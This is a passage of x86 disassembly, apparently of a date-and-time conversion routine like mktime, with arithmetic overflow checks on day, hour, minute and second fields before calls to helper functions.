  404354:	c1 fa 02             	sar    $0x2,%edx
  404357:	8d 0c f1             	lea    (%ecx,%esi,8),%ecx
  40435a:	03 c2                	add    %edx,%eax
  40435c:	8b 57 0c             	mov    0xc(%edi),%edx
  40435f:	8d 0c 89             	lea    (%ecx,%ecx,4),%ecx
  404362:	8d 84 01 21 9c ff ff 	lea    -0x63df(%ecx,%eax,1),%eax
  404369:	85 c0                	test   %eax,%eax
  40436b:	8d 0c 10             	lea    (%eax,%edx,1),%ecx
  40436e:	7c 10                	jl     0x404380
  404370:	85 d2                	test   %edx,%edx
  404372:	7c 08                	jl     0x40437c
  404374:	85 c9                	test   %ecx,%ecx
  404376:	0f 8c 89 01 00 00    	jl     0x404505
  40437c:	85 c0                	test   %eax,%eax
  40437e:	7d 0c                	jge    0x40438c
  404380:	85 d2                	test   %edx,%edx
  404382:	7d 08                	jge    0x40438c
  404384:	85 c9                	test   %ecx,%ecx
  404386:	0f 8d 79 01 00 00    	jge    0x404505
  40438c:	8d 1c 49             	lea    (%ecx,%ecx,2),%ebx
  40438f:	c1 e3 03             	shl    $0x3,%ebx
  404392:	85 c9                	test   %ecx,%ecx
  404394:	74 11                	je     0x4043a7
  404396:	8b c3                	mov    %ebx,%eax
  404398:	99                   	cltd
  404399:	f7 f9                	idiv   %ecx
  40439b:	33 d2                	xor    %edx,%edx
  40439d:	83 f8 18             	cmp    $0x18,%eax
  4043a0:	0f 95 c2             	setne  %dl
  4043a3:	8b c2                	mov    %edx,%eax
  4043a5:	eb 02                	jmp    0x4043a9
  4043a7:	33 c0                	xor    %eax,%eax
  4043a9:	85 c0                	test   %eax,%eax
  4043ab:	0f 85 54 01 00 00    	jne    0x404505
  4043b1:	8b 47 08             	mov    0x8(%edi),%eax
  4043b4:	85 db                	test   %ebx,%ebx
  4043b6:	8d 34 18             	lea    (%eax,%ebx,1),%esi
  4043b9:	7c 10                	jl     0x4043cb
  4043bb:	85 c0                	test   %eax,%eax
  4043bd:	7c 08                	jl     0x4043c7
  4043bf:	85 f6                	test   %esi,%esi
  4043c1:	0f 8c 3e 01 00 00    	jl     0x404505
  4043c7:	85 db                	test   %ebx,%ebx
  4043c9:	7d 0c                	jge    0x4043d7
  4043cb:	85 c0                	test   %eax,%eax
  4043cd:	7d 08                	jge    0x4043d7
  4043cf:	85 f6                	test   %esi,%esi
  4043d1:	0f 8d 2e 01 00 00    	jge    0x404505
  4043d7:	8b ce                	mov    %esi,%ecx
  4043d9:	c1 e1 04             	shl    $0x4,%ecx
  4043dc:	2b ce                	sub    %esi,%ecx
  4043de:	c1 e1 02             	shl    $0x2,%ecx
  4043e1:	85 f6                	test   %esi,%esi
  4043e3:	74 11                	je     0x4043f6
  4043e5:	8b c1                	mov    %ecx,%eax
  4043e7:	99                   	cltd
  4043e8:	f7 fe                	idiv   %esi
  4043ea:	33 d2                	xor    %edx,%edx
  4043ec:	83 f8 3c             	cmp    $0x3c,%eax
  4043ef:	0f 95 c2             	setne  %dl
  4043f2:	8b c2                	mov    %edx,%eax
  4043f4:	eb 02                	jmp    0x4043f8
  4043f6:	33 c0                	xor    %eax,%eax
  4043f8:	85 c0                	test   %eax,%eax
  4043fa:	0f 85 05 01 00 00    	jne    0x404505
  404400:	8b 47 04             	mov    0x4(%edi),%eax
  404403:	85 c9                	test   %ecx,%ecx
  404405:	8d 34 08             	lea    (%eax,%ecx,1),%esi
  404408:	7c 10                	jl     0x40441a
  40440a:	85 c0                	test   %eax,%eax
  40440c:	7c 08                	jl     0x404416
  40440e:	85 f6                	test   %esi,%esi
  404410:	0f 8c ef 00 00 00    	jl     0x404505
  404416:	85 c9                	test   %ecx,%ecx
  404418:	7d 0c                	jge    0x404426
  40441a:	85 c0                	test   %eax,%eax
  40441c:	7d 08                	jge    0x404426
  40441e:	85 f6                	test   %esi,%esi
  404420:	0f 8d df 00 00 00    	jge    0x404505
  404426:	8b ce                	mov    %esi,%ecx
  404428:	c1 e1 04             	shl    $0x4,%ecx
  40442b:	2b ce                	sub    %esi,%ecx
  40442d:	c1 e1 02             	shl    $0x2,%ecx
  404430:	85 f6                	test   %esi,%esi
  404432:	74 11                	je     0x404445
  404434:	8b c1                	mov    %ecx,%eax
  404436:	99                   	cltd
  404437:	f7 fe                	idiv   %esi
  404439:	33 d2                	xor    %edx,%edx
  40443b:	83 f8 3c             	cmp    $0x3c,%eax
  40443e:	0f 95 c2             	setne  %dl
  404441:	8b c2                	mov    %edx,%eax
  404443:	eb 02                	jmp    0x404447
  404445:	33 c0                	xor    %eax,%eax
  404447:	85 c0                	test   %eax,%eax
  404449:	0f 85 b6 00 00 00    	jne    0x404505
  40444f:	8b 07                	mov    (%edi),%eax
  404451:	85 c9                	test   %ecx,%ecx
  404453:	8d 14 08             	lea    (%eax,%ecx,1),%edx
  404456:	89 54 24 10          	mov    %edx,0x10(%esp)
  40445a:	7c 10                	jl     0x40446c
  40445c:	85 c0                	test   %eax,%eax
  40445e:	7c 08                	jl     0x404468
  404460:	85 d2                	test   %edx,%edx
  404462:	0f 8c 9d 00 00 00    	jl     0x404505
  404468:	85 c9                	test   %ecx,%ecx
  40446a:	7d 0c                	jge    0x404478
  40446c:	85 c0                	test   %eax,%eax
  40446e:	7d 08                	jge    0x404478
  404470:	85 d2                	test   %edx,%edx
  404472:	0f 8d 8d 00 00 00    	jge    0x404505
  404478:	8b 44 24 14          	mov    0x14(%esp),%eax
  40447c:	85 c0                	test   %eax,%eax
  40447e:	74 63                	je     0x4044e3
  404480:	e8 fb 3f 00 00       	call   0x408480
  404485:	a1 58 c0 42 00       	mov    0x42c058,%eax
  40448a:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  40448e:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  404492:	03 d8                	add    %eax,%ebx
  404494:	51                   	push   %ecx
  404495:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  404499:	e8 e2 01 00 00       	call   0x404680
  40449e:	83 c4 04             	add    $0x4,%esp
  4044a1:	85 c0                	test   %eax,%eax
  4044a3:	74 60                	je     0x404505
  4044a5:	8b 4f 20             	mov    0x20(%edi),%ecx
  4044a8:	85 c9                	test   %ecx,%ecx
  4044aa:	7f 09                	jg     0x4044b5
  4044ac:	7d 46                	jge    0x4044f4
  4044ae:	8b 48 20             	mov    0x20(%eax),%ecx
  4044b1:	85 c9                	test   %ecx,%ecx
  4044b3:	7e 3f                	jle    0x4044f4
  4044b5:	8b 15 60 c0 42 00    	mov    0x42c060,%edx
  4044bb:	8b 74 24 10          	mov    0x10(%esp),%esi
  4044bf:	8d 44 24 10          	lea    0x10(%esp),%eax
  4044c3:	03 f2                	add    %edx,%esi
  4044c5:	50                   	push   %eax
  4044c6:	89 74 24 14          	mov    %esi,0x14(%esp)
  4044ca:	e8 b1 01 00 00       	call   0x404680
  4044cf:	b9 09 00 00 00       	mov    $0x9,%ecx
  4044d4:	8b f0                	mov    %eax,%esi
  4044d6:	8b 44 24 14          	mov    0x14(%esp),%eax
  4044da:	83 c4 04             	add    $0x4,%esp
  4044dd:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
